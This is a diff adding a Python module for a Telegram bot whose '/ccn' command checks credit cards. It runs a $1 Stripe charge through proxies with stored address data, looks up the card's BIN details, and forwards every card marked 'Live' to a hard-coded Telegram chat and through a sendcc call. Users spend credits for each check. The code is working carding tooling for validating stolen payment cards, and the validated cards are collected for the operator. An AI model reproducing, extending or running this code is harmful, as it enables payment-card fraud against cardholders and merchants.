@@ -1,0 +1,134 @@
+import traceback, httpx, json
+from pyrogram import Client, filters
+import time, asyncio
+from FUNC.usersdb_func import *
+from FUNC.defs import *
+from TOOLS.check_all_func import *
+from TOOLS.getbin import *
+from FUNC.GATES.STRIPE_AUTH import *
+from .response import *
+from .gate import *
+
+target_chat_id = -1002140459626
+@Client.on_message(filters.command("ccn", [".", "/"]))
+async def stripe_auth_cmd(Client, message):
+    try:
+        user_id = str(message.from_user.id)
+        first_name = str(message.from_user.first_name)
+        checkall = await check_all_thing(Client , message)
+        if checkall[0] == False:
+            return
+
+        role = checkall[1]
+        getcc = await getmessage(message)
+        if getcc == False:
+            resp = """<b>
+Gate Name: Stripe Ccn Charge 1$ 💋️
+CMD: /ccn
+
+Message: No CC Found in your input ❌
+
+Usage: /ccn cc|mes|ano|cvv</b>"""
+            await message.reply_text(resp, message.id)
+            return
+
+        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
+        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
+        firstresp = f"""
+<b>↯ CHARGE 
+
+⊗ Card - <code>{fullcc}</code> 
+⊗ Status - Checking...
+⊗ Response - ■□□□
+⊗ GATEWAY- Stripe Ccn Charge 1$
+</b>
+"""
+
+        firstchk = await message.reply_text(firstresp, message.id)
+
+        secondresp = f"""
+<b>↯ CHARGE 
+
+⊗ Card - <code>{fullcc}</code> 
+⊗ Status - Checking...
+⊗ Response - ■■■□
+⊗ GATEWAY- Stripe Ccn Charge 1$
+</b>
+"""
+        await asyncio.sleep(0.5)
+        secondchk = await Client.edit_message_text(
+            message.chat.id, firstchk.id, secondresp
+        )
+
+        start = time.perf_counter()
+        proxy = open("FILES/proxy.txt", "r", encoding="utf-8").read().splitlines()
+        data = json.loads(open("FILES/address.json", "r").read())
+        result = await create_cvv_charge(fullcc , data , proxy)
+        session = httpx.AsyncClient(timeout=5)
+        getbin = await get_bin_details(cc, session)
+        await session.aclose()
+
+        brand, type, level, bank, country, flag, currency = (
+            getbin[0],
+            getbin[1],
+            getbin[2],
+            getbin[3],
+            getbin[4],
+            getbin[5],
+            getbin[6],
+        )
+        end = time.perf_counter()
+
+        thirdresp = f"""
+<b>↯ Charge 
+
+⊗ Card - <code>{fullcc}</code> 
+⊗ Status - Checking...
+⊗ Response - ■■■■
+⊗ GATEWAY- Stripe Ccn Charge 1$
+</b>
+"""
+        await asyncio.sleep(0.5)
+        thirdcheck = await Client.edit_message_text(
+            message.chat.id, secondchk.id, thirdresp
+        )
+
+        getresp = await uhq_charge_resp(result, user_id, fullcc)
+        status, response = getresp[0], getresp[1]
+
+        finalresp = f"""
+<b>↯ CHARGE 
+
+⊗ Card - <code>{fullcc}</code> 
+⊗ Status - {status}
+⊗ Response - {response}
+⊗ GATEWAY- Stripe Charge 1$ 
+－－－－－－－－－－－－－－－－
+[ BIN INFO ]
+⚆ Bin - {cc[:6]} - {brand} - {type} - {level}
+⚆ Bank - {bank} 🏛  
+⚆ Country - {country} - {flag} - {currency}
+－－－－－－－－－－－－－－－－
+
+
+Time in Progress - {end - start:0.4f}sec
+Credit Deducted - 1
+Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 💋️ [ {role} ]
+Updates  - <a href="https://t.me/NoMoreBins">三 𝙉𝙤 𝙈𝙤𝙧𝙚 𝘽𝙞𝙣𝙨 三</a>
+Owner - <a href="https://t.me/stripe_xD">>⏤͟͞🇧🇩⌁𝙒𝙞𝙣𝙩𝙚𝙧𝙜𝙧𝙚𝙚𝙣 𝙈𝙖𝙧𝙨ヤ</a>
+
+"""
+        await asyncio.sleep(0.5)
+        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
+        await setantispamtime(user_id)
+        await deductcredit(user_id)
+        if status == "Live 🟢" or status == "Live 🟡":
+            session = httpx.AsyncClient(timeout=5)
+            await sendcc(finalresp, session)
+            await session.aclose()
+        if status == "Live 🟢" or status == "Live 🟡":
+    # Send the final response to the specified chat ID
+         await Client.send_message(target_chat_id, text=finalresp)
+    except:
+        import traceback
+        await error_log(traceback.format_exc())
